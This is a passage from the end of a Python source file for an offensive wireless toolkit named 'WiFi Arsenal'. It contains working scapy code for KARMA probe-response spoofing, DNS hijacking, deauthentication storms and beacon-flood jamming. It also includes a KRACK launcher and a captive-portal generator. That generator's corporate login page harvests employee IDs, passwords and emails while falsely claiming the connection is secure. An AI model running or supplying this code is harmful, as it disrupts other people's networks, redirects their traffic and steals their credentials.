            
            print(f"{Fore.GREEN}[+] MAC address changed successfully{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] MAC change failed: {e}{Style.RESET_ALL}")
    
    def restore_mac_address(self):
        """Restore original MAC"""
        try:
            print(f"{Fore.YELLOW}[*] Restoring original MAC address...{Style.RESET_ALL}")
            
            if self.command_exists('macchanger'):
                subprocess.run(['macchanger', '-p', self.interface], 
                              capture_output=True, timeout=10)
            
            print(f"{Fore.GREEN}[+] MAC address restored{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] MAC restore failed: {e}{Style.RESET_ALL}")
    
    def rogue_ap_menu(self):
        """Rogue AP menu"""
        print(f"{Fore.YELLOW}[*] Setting up rogue access point...{Style.RESET_ALL}")
        
        ssid = input(f"{Fore.CYAN}[?] AP SSID (default 'Free_WiFi'): {Style.RESET_ALL}") or "Free_WiFi"
        channel = input(f"{Fore.CYAN}[?] Channel (1-11, default 6): {Style.RESET_ALL}") or "6"
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        attack_dir = f"{self.results_dir}/attacks/rogue_ap_{timestamp}"
        os.makedirs(attack_dir, exist_ok=True)
        
        hostapd_config = f"""interface={self.monitor_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        config_file = f"{attack_dir}/rogue_ap.conf"
        with open(config_file, 'w') as f:
            f.write(hostapd_config)
        
        print(f"{Fore.GREEN}[+] Rogue AP configuration created{Style.RESET_ALL}")
        print(f"[*] Start with: hostapd {config_file}")
    
    def karma_attack_menu(self):
        """KARMA attack menu"""
        print(f"{Fore.YELLOW}[*] Setting up KARMA attack...{Style.RESET_ALL}")
        
        probe_requests = set()
        client_probes = {}
        
        def probe_handler(packet):
            if packet.haslayer(Dot11ProbeReq):
                client_mac = packet[Dot11].addr2
                if packet[Dot11Elt] and packet[Dot11Elt].info:
                    ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                    if ssid and len(ssid) > 0:
                        probe_requests.add(ssid)
                        if client_mac not in client_probes:
                            client_probes[client_mac] = set()
                        client_probes[client_mac].add(ssid)
                        print(f"[+] {client_mac} probing for: {ssid}")
        
        try:
            print(f"[*] Listening for probe requests (60 seconds)...")
            sniff(iface=self.monitor_interface, prn=probe_handler, timeout=60, store=False)
            
            if probe_requests:
                print(f"\n{Fore.GREEN}[+] Captured {len(probe_requests)} unique SSIDs from {len(client_probes)} clients{Style.RESET_ALL}")
                
                for client, ssids in client_probes.items():
                    print(f"  {client}: {', '.join(list(ssids)[:3])}{'...' if len(ssids) > 3 else ''}")
                
                self.start_karma_response(probe_requests, client_probes)
                
            else:
                print(f"{Fore.YELLOW}[*] No probe requests captured{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] KARMA attack failed: {e}{Style.RESET_ALL}")
    
    def start_karma_response(self, probe_requests, client_probes):
        """Start KARMA response"""
        print(f"{Fore.YELLOW}[*] Starting KARMA probe response attack...{Style.RESET_ALL}")
        
        fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
        
        def karma_responder():
            while True:
                try:
                    for ssid in probe_requests:
                        response = RadioTap() / Dot11(
                            type=0, subtype=5,
                            addr1="ff:ff:ff:ff:ff:ff",
                            addr2=fake_mac,
                            addr3=fake_mac
                        ) / Dot11ProbeResp(
                            timestamp=int(time.time() * 1000000),
                            beacon_interval=100,
                            cap="ESS"
                        ) / Dot11Elt(ID="SSID", info=ssid)
                        
                        sendp(response, iface=self.monitor_interface, verbose=False)
                    
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"{Fore.RED}[!] KARMA response error: {e}{Style.RESET_ALL}")
                    break
        
        print(f"[*] Responding to probes for {len(probe_requests)} SSIDs...")
        print(f"[*] Press Ctrl+C to stop KARMA attack")
        
        try:
            karma_responder()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] KARMA attack stopped{Style.RESET_ALL}")
    
    def krack_attack_menu(self):
        """KRACK attack menu"""
        print(f"{Fore.YELLOW}[*] KRACK Attack - WPA2 Key Reinstallation{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] This attack exploits CVE-2017-13077 (KRACK vulnerability){Style.RESET_ALL}")
        
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        wpa2_networks = [n for n in self.target_networks if 'WPA2' in n.get('privacy', '')]
        
        if not wpa2_networks:
            print(f"{Fore.RED}[!] No WPA2 networks found{Style.RESET_ALL}")
            return
        
        self.display_networks(wpa2_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select WPA2 target: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(wpa2_networks):
                target = wpa2_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Attempting KRACK attack on {target['essid']}...{Style.RESET_ALL}")
                print(f"[*] Monitoring for vulnerable handshakes...")
                
                if self.command_exists('krack-test-client.py'):
                    subprocess.run([
                        'python3', 'krack-test-client.py',
                        '--target', target['bssid'],
                        '--interface', self.monitor_interface
                    ], timeout=300, capture_output=True)
                else:
                    print(f"{Fore.RED}[!] KRACK testing tools not installed{Style.RESET_ALL}")
                    print(f"[*] Install krackattacks-scripts for full KRACK testing")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def network_mapper_menu(self):
        """Network mapper menu"""
        print(f"{Fore.CYAN}[*] Network Mapping and Topology Discovery{Style.RESET_ALL}")
        
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        print(f"[*] Analyzing network topology...")
        
        channel_map = {}
        vendor_map = {}
        
        for network in self.target_networks:
            channel = network.get('channel', 'Unknown')
            bssid = network.get('bssid', '')
            
            if channel not in channel_map:
                channel_map[channel] = []
            channel_map[channel].append(network)
            
            if bssid:
                oui = bssid[:8].upper().replace(':', '')
                vendor = self.lookup_vendor(oui)
                if vendor not in vendor_map:
                    vendor_map[vendor] = []
                vendor_map[vendor].append(network)
        
        print(f"\n{Fore.CYAN}[*] Channel Utilization:{Style.RESET_ALL}")
        for channel, networks in sorted(channel_map.items()):
            print(f"  Channel {channel}: {len(networks)} networks")
            for net in networks[:3]:
                print(f"    - {net['essid']} ({net['bssid']})")
        
        print(f"\n{Fore.CYAN}[*] Vendor Analysis:{Style.RESET_ALL}")
        for vendor, networks in sorted(vendor_map.items(), key=lambda x: len(x[1]), reverse=True)[:5]:
            print(f"  {vendor}: {len(networks)} devices")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        mapping_file = f"{self.results_dir}/scans/network_map_{timestamp}.json"
        
        mapping_data = {
            'timestamp': timestamp,
            'channel_utilization': {k: len(v) for k, v in channel_map.items()},
            'vendor_distribution': {k: len(v) for k, v in vendor_map.items()},
            'total_networks': len(self.target_networks)
        }
        
        with open(mapping_file, 'w') as f:
            json.dump(mapping_data, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Network mapping saved to {mapping_file}{Style.RESET_ALL}")
    
    def lookup_vendor(self, oui):
        """Lookup vendor by OUI"""
        vendor_db = {
            '00:1B:63': 'Apple',
            '00:07:AB': 'Samsung',
            '00:1F:3C': 'Intel',
            '00:0C:29': 'Cisco',
            '00:14:6C': 'Netgear',
            '00:1E:58': 'D-Link',
            '00:26:BB': 'Linksys',
            '00:23:69': 'TP-Link'
        }
        
        return vendor_db.get(oui, 'Unknown')
    
    def client_monitoring_menu(self):
        """Client monitoring menu"""
        print(f"{Fore.CYAN}[*] Client Monitoring and Analysis{Style.RESET_ALL}")
        
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select network to monitor clients: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                duration = int(input(f"{Fore.CYAN}[?] Monitoring duration in seconds (default 60): {Style.RESET_ALL}") or "60")
                
                print(f"{Fore.YELLOW}[*] Monitoring clients for {target['essid']} for {duration} seconds...{Style.RESET_ALL}")
                
                clients = {}
                
                def client_handler(packet):
                    if packet.haslayer(Dot11):
                        if packet.type == 2:
                            src = packet.addr2
                            dst = packet.addr1
                            bssid = packet.addr3
                            
                            if bssid and bssid.lower() == target['bssid'].lower():
                                if src != bssid and src not in clients:
                                    clients[src] = {
                                        'first_seen': datetime.now().isoformat(),
                                        'packets': 0,
                                        'vendor': self.lookup_vendor(src[:8].upper().replace(':', ''))
                                    }
                                    print(f"[+] New client: {src} ({clients[src]['vendor']})")
                                
                                if src in clients:
                                    clients[src]['packets'] += 1
                
                try:
                    sniff(iface=self.monitor_interface, prn=client_handler, timeout=duration, store=False)
                    
                    if clients:
                        print(f"\n{Fore.GREEN}[+] Discovered {len(clients)} clients:{Style.RESET_ALL}")
                        for mac, info in clients.items():
                            print(f"  {mac} - {info['vendor']} ({info['packets']} packets)")
                        
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        client_file = f"{self.results_dir}/scans/clients_{timestamp}.json"
                        
                        client_data = {
                            'target_network': target,
                            'clients': clients,
                            'timestamp': timestamp
                        }
                        
                        with open(client_file, 'w') as f:
                            json.dump(client_data, f, indent=2)
                        
                        print(f"[+] Client data saved to {client_file}")
                    else:
                        print(f"{Fore.YELLOW}[-] No clients detected{Style.RESET_ALL}")
                
                except Exception as e:
                    print(f"{Fore.RED}[!] Client monitoring failed: {e}{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def dns_hijacking_menu(self):
        """DNS hijacking menu"""
        print(f"{Fore.MAGENTA}[*] DNS Hijacking Attack{Style.RESET_ALL}")
        
        target_domain = input(f"{Fore.CYAN}[?] Target domain to hijack (default: google.com): {Style.RESET_ALL}") or "google.com"
        redirect_ip = input(f"{Fore.CYAN}[?] Redirect IP (default: 192.168.1.1): {Style.RESET_ALL}") or "192.168.1.1"
        duration = int(input(f"{Fore.CYAN}[?] Attack duration in seconds (default: 300): {Style.RESET_ALL}") or "300")
        
        print(f"{Fore.YELLOW}[*] Starting DNS hijacking attack...{Style.RESET_ALL}")
        print(f"[*] Hijacking {target_domain} -> {redirect_ip}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        attack_dir = f"{self.results_dir}/attacks/dns_hijack_{timestamp}"
        os.makedirs(attack_dir, exist_ok=True)
        
        dns_script = f"""#!/usr/bin/env python3
import socket
import struct
from scapy.all import *

def dns_hijack():
    def dns_handler(packet):
        if packet.haslayer(DNSQR) and packet[DNSQR].qname.decode().startswith('{target_domain}'):
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \\
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \\
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata='{redirect_ip}'))
            
            send(response, verbose=False)
            print(f"[+] Hijacked DNS query for {{packet[DNSQR].qname.decode()}} -> {redirect_ip}")
    
    print("[*] Starting DNS packet sniffing...")
    sniff(filter="udp port 53", prn=dns_handler, timeout={duration})

if __name__ == "__main__":
    dns_hijack()
"""
        
        script_file = f"{attack_dir}/dns_hijack.py"
        with open(script_file, 'w') as f:
            f.write(dns_script)
        os.chmod(script_file, 0o755)
        
        try:
            subprocess.run(['python3', script_file], timeout=duration + 10)
            print(f"{Fore.GREEN}[+] DNS hijacking attack completed{Style.RESET_ALL}")
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[*] DNS hijacking timed out{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] DNS hijacking failed: {e}{Style.RESET_ALL}")
    
    def packet_injection_menu(self):
        """Packet injection menu"""
        print(f"{Fore.MAGENTA}[*] Packet Injection Attack Suite{Style.RESET_ALL}")
        print("1. Deauth Storm (Multiple targets)")
        print("2. Disassociation Attack")
        print("3. Beacon Spam Attack")
        print("4. Authentication Flood")
        print("5. Custom Packet Injection")
        
        try:
            choice = input(f"{Fore.CYAN}[?] Select injection type: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.deauth_storm()
            elif choice == '2':
                self.disassoc_attack()
            elif choice == '3':
                self.beacon_spam()
            elif choice == '4':
                self.auth_flood()
            elif choice == '5':
                self.custom_injection()
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def deauth_storm(self):
        """Deauth storm attack"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] No target networks available{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}[*] Starting deauth storm on all discovered networks...{Style.RESET_ALL}")
        
        packet_count = int(input(f"{Fore.CYAN}[?] Packets per network (default: 20): {Style.RESET_ALL}") or "20")
        
        for network in self.target_networks:
            bssid = network['bssid']
            essid = network['essid']
            
            print(f"[*] Attacking {essid} ({bssid})")
            
            for i in range(packet_count):
                deauth = RadioTap() / Dot11(
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=bssid,
                    addr3=bssid
                ) / Dot11Deauth(reason=7)
                
                sendp(deauth, iface=self.monitor_interface, verbose=False)
                time.sleep(0.01)
        
        print(f"{Fore.GREEN}[+] Deauth storm completed{Style.RESET_ALL}")
    
    def wifi_jammer_menu(self):
        """WiFi jammer menu"""
        print(f"{Fore.MAGENTA}[*] WiFi Jammer Attack{Style.RESET_ALL}")
        
        print("1. Channel Jammer (Single channel)")
        print("2. Multi-channel Jammer")
        print("3. Targeted Network Jammer")
        print("4. Full Spectrum Jammer")
        
        try:
            choice = input(f"{Fore.CYAN}[?] Select jammer type: {Style.RESET_ALL}").strip()
            duration = int(input(f"{Fore.CYAN}[?] Jam duration in seconds (default: 60): {Style.RESET_ALL}") or "60")
            
            if choice == '1':
                channel = int(input(f"{Fore.CYAN}[?] Channel to jam (1-14): {Style.RESET_ALL}"))
                self.channel_jammer(channel, duration)
            elif choice == '2':
                self.multi_channel_jammer(duration)
            elif choice == '3':
                self.targeted_jammer(duration)
            elif choice == '4':
                self.spectrum_jammer(duration)
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def channel_jammer(self, channel, duration):
        """Channel jammer"""
        print(f"{Fore.YELLOW}[*] Jamming channel {channel} for {duration} seconds...{Style.RESET_ALL}")
        
        try:
            subprocess.run(['iwconfig', self.monitor_interface, 'channel', str(channel)], 
                          timeout=10, capture_output=True)
        except:
            pass
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time:
            for _ in range(10):
                fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
                fake_ssid = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
                
                beacon = RadioTap() / Dot11(
                    type=0, subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=fake_mac,
                    addr3=fake_mac
                ) / Dot11Beacon() / Dot11Elt(ID="SSID", info=fake_ssid)
                
                sendp(beacon, iface=self.monitor_interface, verbose=False)
                packet_count += 1
            
            time.sleep(0.01)
        
        print(f"{Fore.GREEN}[+] Jammer sent {packet_count} packets{Style.RESET_ALL}")
    
    def bluetooth_scanner_menu(self):
        """Bluetooth scanner menu"""
        print(f"{Fore.MAGENTA}[*] Bluetooth Scanner & Attack Suite{Style.RESET_ALL}")
        
        try:
            import bluetooth
            bt_available = True
        except ImportError:
            print(f"{Fore.YELLOW}[*] Installing pybluez for Bluetooth support...{Style.RESET_ALL}")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pybluez'], check=True)
                import bluetooth
                bt_available = True
            except:
                bt_available = False
        
        if not bt_available:
            print(f"{Fore.RED}[!] Bluetooth support not available{Style.RESET_ALL}")
            return
        
        print("1. Bluetooth Device Discovery")
        print("2. Bluetooth Service Scan")
        print("3. Bluetooth MAC Spoofing")
        print("4. BLE Scanner")
        
        try:
            choice = input(f"{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.bluetooth_discovery()
            elif choice == '2':
                self.bluetooth_service_scan()
            elif choice == '3':
                self.bluetooth_mac_spoof()
            elif choice == '4':
                self.ble_scanner()
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def bluetooth_discovery(self):
        """Bluetooth discovery"""
        print(f"{Fore.YELLOW}[*] Scanning for Bluetooth devices...{Style.RESET_ALL}")
        
        try:
            import bluetooth
            
            print("[*] Performing device discovery (this may take a while)...")
            nearby_devices = bluetooth.discover_devices(duration=15, lookup_names=True, flush_cache=True)
            
            if nearby_devices:
                print(f"\n{Fore.GREEN}[+] Found {len(nearby_devices)} Bluetooth devices:{Style.RESET_ALL}")
                for addr, name in nearby_devices:
                    print(f"  {addr} - {name if name else 'Unknown'}")
                    
                    try:
                        services = bluetooth.find_service(address=addr)
                        if services:
                            print(f"    Services: {len(services)} found")
                    except:
                        pass
            else:
                print(f"{Fore.YELLOW}[-] No Bluetooth devices found{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Bluetooth scan failed: {e}{Style.RESET_ALL}")
    
    def captive_portal_generator_menu(self):
        """Captive portal generator menu"""
        print(f"{Fore.MAGENTA}[*] Advanced Captive Portal Generator{Style.RESET_ALL}")
        
        print("Portal Templates:")
        print("1. Corporate Login")
        print("2. Hotel WiFi")
        print("3. Coffee Shop")
        print("4. Airport WiFi")
        print("5. Social Media Login")
        print("6. Custom Template")
        
        try:
            choice = input(f"{Fore.CYAN}[?] Select template: {Style.RESET_ALL}").strip()
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            portal_dir = f"{self.results_dir}/attacks/captive_portal_{timestamp}"
            os.makedirs(portal_dir, exist_ok=True)
            
            if choice == '1':
                self.create_corporate_portal(portal_dir)
            elif choice == '2':
                self.create_hotel_portal(portal_dir)
            elif choice == '3':
                self.create_coffee_portal(portal_dir)
            elif choice == '4':
                self.create_airport_portal(portal_dir)
            elif choice == '5':
                self.create_social_portal(portal_dir)
            elif choice == '6':
                self.create_custom_portal(portal_dir)
            
            print(f"{Fore.GREEN}[+] Captive portal created in {portal_dir}{Style.RESET_ALL}")
            
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def create_corporate_portal(self, portal_dir):
        """Create corporate portal"""
        portal_html = """<!DOCTYPE html>
<html>
<head>
    <title>Corporate Network Access</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        h1 { color: #2c5aa0; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #2c5aa0; color: white; border: none; border-radius: 5px; cursor: pointer; }
        .notice { background: #e8f4fd; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏢</div>
        <h1>Secure Network Access</h1>
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Employee ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="email" placeholder="Corporate Email" required>
            <button type="submit">Connect to Network</button>
        </form>
        <div class="notice">
            🔒 This connection is secured with enterprise-grade encryption. Your credentials are protected by our corporate security policy.
        </div>
    </div>
</body>
</html>"""
        
        with open(f"{portal_dir}/index.html", 'w') as f:
            f.write(portal_html)
    
    def cleanup_and_exit(self):
        """Cleanup and exit"""
        print(f"\n{Fore.YELLOW}[*] Cleaning up...{Style.RESET_ALL}")
        
        self.stop_monitor_mode()
        
        self.logger.info("WiFi Arsenal session ended")
        
        print(f"{Fore.GREEN}[*] Thank you for using WiFi Arsenal!")
        print(f"[*] Results saved in: {self.results_dir}")
        print(f"[*] Developed by {self.author}{Style.RESET_ALL}")
        
        sys.exit(0)

    def run(self):
        """Main execution"""
        self.banner()
        
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] Root privileges required for full functionality")
            print(f"[*] Run with: sudo python3 wifi_arsenal.py{Style.RESET_ALL}")
            
            response = input(f"{Fore.YELLOW}[?] Continue with limited functionality? (y/N): {Style.RESET_ALL}")
            if response.lower() != 'y':
                sys.exit(1)
        
        if not self.check_dependencies():
            print(f"{Fore.YELLOW}[*] Some functionality may be limited{Style.RESET_ALL}")
        
        signal.signal(signal.SIGINT, lambda sig, frame: self.cleanup_and_exit())
        signal.signal(signal.SIGTERM, lambda sig, frame: self.cleanup_and_exit())
        
        print(f"{Fore.GREEN}[+] WiFi Arsenal initialized successfully")
        print(f"[*] Full real implementation ready...{Style.RESET_ALL}")
        
        self.logger.info(f"WiFi Arsenal v{self.version} started")
        
        self.main_menu()

def main():
    """Main entry point"""
    try:
        arsenal = WiFiArsenal()
        arsenal.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
